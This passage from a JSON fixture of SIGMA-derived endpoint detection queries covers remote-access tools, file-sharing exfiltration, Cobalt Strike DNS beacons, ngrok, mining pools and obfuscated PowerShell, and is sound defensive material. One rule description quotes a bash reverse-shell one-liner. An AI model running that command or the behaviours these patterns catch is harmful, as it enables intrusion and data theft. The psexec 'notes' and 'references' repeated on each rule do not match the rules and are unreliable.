            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "DNS Query To Remote Access Software Domain From Non-Browser App",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and (((event.dns.request contains \"agent.jumpcloud.com\" or event.dns.request contains \"agentreporting.atera.com\" or event.dns.request contains \"ammyy.com\" or event.dns.request contains \"api.parsec.app\" or event.dns.request contains \"api.playanext.com\" or event.dns.request contains \"api.splashtop.com\" or event.dns.request contains \"app.atera.com\" or event.dns.request contains \"assist.zoho.com\" or event.dns.request contains \"authentication.logmeininc.com\" or event.dns.request contains \"beyondtrustcloud.com\" or event.dns.request contains \"cdn.kaseya.net\" or event.dns.request contains \"client.teamviewer.com\" or event.dns.request contains \"comserver.corporate.beanywhere.com\" or event.dns.request contains \"control.connectwise.com\" or event.dns.request contains \"downloads.zohocdn.com\" or event.dns.request contains \"dwservice.net\" or event.dns.request contains \"express.gotoassist.com\" or event.dns.request contains \"getgo.com\" or event.dns.request contains \"getscreen.me\" or event.dns.request contains \"integratedchat.teamviewer.com\" or event.dns.request contains \"join.zoho.com\" or event.dns.request contains \"kickstart.jumpcloud.com\" or event.dns.request contains \"license.bomgar.com\" or event.dns.request contains \"logmein-gateway.com\" or event.dns.request contains \"logmein.com\" or event.dns.request contains \"logmeincdn.http.internapcdn.net\" or event.dns.request contains \"n-able.com\" or event.dns.request contains \"net.anydesk.com\" or event.dns.request contains \"netsupportsoftware.com\" or event.dns.request contains \"parsecusercontent.com\" or event.dns.request contains \"pubsub.atera.com\" or event.dns.request contains \"relay.kaseya.net\" or event.dns.request contains \"relay.screenconnect.com\" or event.dns.request contains \"relay.splashtop.com\" or event.dns.request contains \"remoteassistance.support.services.microsoft.com\" or event.dns.request contains \"remotedesktop-pa.googleapis.com\" or event.dns.request contains \"remoteutilities.com\" or event.dns.request contains \"secure.logmeinrescue.com\" or event.dns.request contains \"services.vnc.com\" or event.dns.request contains \"static.remotepc.com\" or event.dns.request contains \"swi-rc.com\" or event.dns.request contains \"swi-tc.com\" or event.dns.request contains \"tailscale.com\" or event.dns.request contains \"telemetry.servers.qetqo.com\" or event.dns.request contains \"tmate.io\" or event.dns.request contains \"twingate.com\" or event.dns.request contains \"zohoassist.com\") or (event.dns.request contains \".rustdesk.com\" and event.dns.request contains \"rs-\")) and (not ((src.process.image.path in (\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\",\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) or (src.process.image.path in (\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\",\"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) or (src.process.image.path in (\"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\",\"C:\\Program Files\\Internet Explorer\\iexplore.exe\")) or (src.process.image.path contains \"C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\\" or src.process.image.path contains \"\\WindowsApps\\MicrosoftEdge.exe\" or (src.process.image.path in (\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\",\"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\"))) or ((src.process.image.path contains \"C:\\Program Files (x86)\\Microsoft\\EdgeCore\\\" or src.process.image.path contains \"C:\\Program Files\\Microsoft\\EdgeCore\\\") and (src.process.image.path contains \"\\msedge.exe\" or src.process.image.path contains \"\\msedgewebview2.exe\")) or src.process.image.path contains \"\\safari.exe\" or (src.process.image.path contains \"\\MsMpEng.exe\" or src.process.image.path contains \"\\MsSense.exe\") or (src.process.image.path contains \"\\brave.exe\" and src.process.image.path contains \"C:\\Program Files\\BraveSoftware\\\") or (src.process.image.path contains \"\\AppData\\Local\\Maxthon\\\" and src.process.image.path contains \"\\maxthon.exe\") or (src.process.image.path contains \"\\AppData\\Local\\Programs\\Opera\\\" and src.process.image.path contains \"\\opera.exe\") or ((src.process.image.path contains \"C:\\Program Files\\SeaMonkey\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\SeaMonkey\\\") and src.process.image.path contains \"\\seamonkey.exe\") or (src.process.image.path contains \"\\AppData\\Local\\Vivaldi\\\" and src.process.image.path contains \"\\vivaldi.exe\") or ((src.process.image.path contains \"C:\\Program Files\\Naver\\Naver Whale\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\Naver\\Naver Whale\\\") and src.process.image.path contains \"\\whale.exe\") or src.process.image.path contains \"\\Tor Browser\\\" or ((src.process.image.path contains \"C:\\Program Files\\Waterfox\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\Waterfox\\\") and src.process.image.path contains \"\\Waterfox.exe\") or (src.process.image.path contains \"\\AppData\\Local\\Programs\\midori-ng\\\" and src.process.image.path contains \"\\Midori Next Generation.exe\") or ((src.process.image.path contains \"C:\\Program Files\\SlimBrowser\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\SlimBrowser\\\") and src.process.image.path contains \"\\slimbrowser.exe\") or (src.process.image.path contains \"\\AppData\\Local\\Flock\\\" and src.process.image.path contains \"\\Flock.exe\") or (src.process.image.path contains \"\\AppData\\Local\\Phoebe\\\" and src.process.image.path contains \"\\Phoebe.exe\") or ((src.process.image.path contains \"C:\\Program Files\\Falkon\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\Falkon\\\") and src.process.image.path contains \"\\falkon.exe\") or ((src.process.image.path contains \"C:\\Program Files (x86)\\Avant Browser\\\" or src.process.image.path contains \"C:\\Program Files\\Avant Browser\\\") and src.process.image.path contains \"\\avant.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 103
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS queries for \"anonfiles.com\", which is an anonymous file upload platform often used for malicious purposes",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1567"
            ],
            "name": "DNS Query for Anonfiles.com Domain - Sysmon",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and event.dns.request contains \".anonfiles.com\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 104
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS query requests to \"update.onelaunch.com\". This domain is associated with the OneLaunch adware application.\nWhen the OneLaunch application is installed it will attempt to get updates from this domain.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1056"
            ],
            "name": "DNS Query Request To OneLaunch Update Service",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and (event.dns.request=\"update.onelaunch.com\" and src.process.image.path contains \"\\OneLaunch.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 105
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1071"
            ],
            "name": "Suspicious Cobalt Strike DNS Beaconing - Sysmon",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and ((event.dns.request contains \"aaa.stage.\" or event.dns.request contains \"post.1\") or event.dns.request contains \".stage.123456.\")) | columns src.process.image.path,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 106
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS queries to \"ufile.io\", which was seen abused by malware and threat actors as a method for data exfiltration",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1567"
            ],
            "name": "DNS Query To Ufile.io",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and event.dns.request contains \"ufile.io\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 107
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS queries to an \".onion\" address related to Tor routing networks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1090"
            ],
            "name": "DNS Query Tor .Onion Address - Sysmon",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and event.dns.request contains \".onion\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 108
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Linux Reverse Shell Indicator",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"linux\" and (src.process.image.path contains \"/bin/bash\" and (not (dst.ip.address in (\"127.0.0.1\",\"0.0.0.0\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 109
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1567",
                "t1568",
                "t1572",
                "t1090",
                "t1102"
            ],
            "name": "Communication To Ngrok Tunneling Service - Linux",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"linux\" and ((url.address contains \"tunnel.us.ngrok.com\" or url.address contains \"tunnel.eu.ngrok.com\" or url.address contains \"tunnel.ap.ngrok.com\" or url.address contains \"tunnel.au.ngrok.com\" or url.address contains \"tunnel.sa.ngrok.com\" or url.address contains \"tunnel.jp.ngrok.com\" or url.address contains \"tunnel.in.ngrok.com\") or (event.dns.request contains \"tunnel.us.ngrok.com\" or event.dns.request contains \"tunnel.eu.ngrok.com\" or event.dns.request contains \"tunnel.ap.ngrok.com\" or event.dns.request contains \"tunnel.au.ngrok.com\" or event.dns.request contains \"tunnel.sa.ngrok.com\" or event.dns.request contains \"tunnel.jp.ngrok.com\" or event.dns.request contains \"tunnel.in.ngrok.com\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 110
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects process connections to a Monero crypto mining pool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1496"
            ],
            "name": "Linux Crypto Mining Pool Connections",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"linux\" and ((url.address in (\"pool.minexmr.com\",\"fr.minexmr.com\",\"de.minexmr.com\",\"sg.minexmr.com\",\"ca.minexmr.com\",\"us-west.minexmr.com\",\"pool.supportxmr.com\",\"mine.c3pool.com\",\"xmr-eu1.nanopool.org\",\"xmr-eu2.nanopool.org\",\"xmr-us-east1.nanopool.org\",\"xmr-us-west1.nanopool.org\",\"xmr-asia1.nanopool.org\",\"xmr-jp1.nanopool.org\",\"xmr-au1.nanopool.org\",\"xmr.2miners.com\",\"xmr.hashcity.org\",\"xmr.f2pool.com\",\"xmrpool.eu\",\"pool.hashvault.pro\",\"moneroocean.stream\",\"monerocean.stream\")) or (event.dns.request in (\"pool.minexmr.com\",\"fr.minexmr.com\",\"de.minexmr.com\",\"sg.minexmr.com\",\"ca.minexmr.com\",\"us-west.minexmr.com\",\"pool.supportxmr.com\",\"mine.c3pool.com\",\"xmr-eu1.nanopool.org\",\"xmr-eu2.nanopool.org\",\"xmr-us-east1.nanopool.org\",\"xmr-us-west1.nanopool.org\",\"xmr-asia1.nanopool.org\",\"xmr-jp1.nanopool.org\",\"xmr-au1.nanopool.org\",\"xmr.2miners.com\",\"xmr.hashcity.org\",\"xmr.f2pool.com\",\"xmrpool.eu\",\"pool.hashvault.pro\",\"moneroocean.stream\",\"monerocean.stream\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 111
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Disabled IE Security Features",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -name IEHarden \" and tgt.process.cmdline contains \" -value 0 \") or (tgt.process.cmdline contains \" -name DEPOff \" and tgt.process.cmdline contains \" -value 1 \") or (tgt.process.cmdline contains \" -name DisableFirstRunCustomize \" and tgt.process.cmdline contains \" -value 2 \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 112
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1547"
            ],
            "name": "Suspicious GrpConv Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"grpconv.exe -o\" or tgt.process.cmdline contains \"grpconv -o\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 113
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated Powershell via Stdin in Scripts",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation Via Stdin",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline matches \"(?i)(set).*&&\\\\s?set.*(environment|invoke|\\\\$\\\\{?input).*&&.*\"\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 114
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects using SettingSyncHost.exe to run hijacked binary",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Using SettingSyncHost.exe as LOLBin",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((not (tgt.process.image.path contains \"C:\\Windows\\System32\\\" or tgt.process.image.path contains \"C:\\Windows\\SysWOW64\\\")) and (src.process.cmdline contains \"cmd.exe /c\" and src.process.cmdline contains \"RoamDiag.cmd\" and src.process.cmdline contains \"-outputpath\"))) | columns TargetFilename,tgt.process.image.path",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 115
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious base64 encoded and obfuscated \"LOAD\" keyword used in .NET \"reflection.assembly\"",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1027"
            ],
            "name": "Suspicious Encoded And Obfuscated Reflection Assembly Load Function Call",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ\" or tgt.process.cmdline contains \"oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA\" or tgt.process.cmdline contains \"6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA\" or tgt.process.cmdline contains \"OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ\" or tgt.process.cmdline contains \"oAOgAoACIATABvACIAKwAiAGEAZAAiACkA\" or tgt.process.cmdline contains \"6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA\" or tgt.process.cmdline contains \"OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ\" or tgt.process.cmdline contains \"oAOgAoACIATABvAGEAIgArACIAZAAiACkA\" or tgt.process.cmdline contains \"6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA\" or tgt.process.cmdline contains \"OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ\" or tgt.process.cmdline contains \"oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA\" or tgt.process.cmdline contains \"6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA\" or tgt.process.cmdline contains \"OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ\" or tgt.process.cmdline contains \"oAOgAoACcATABvACcAKwAnAGEAZAAnACkA\" or tgt.process.cmdline contains \"6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA\" or tgt.process.cmdline contains \"OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ\" or tgt.process.cmdline contains \"oAOgAoACcATABvAGEAJwArACcAZAAnACkA\" or 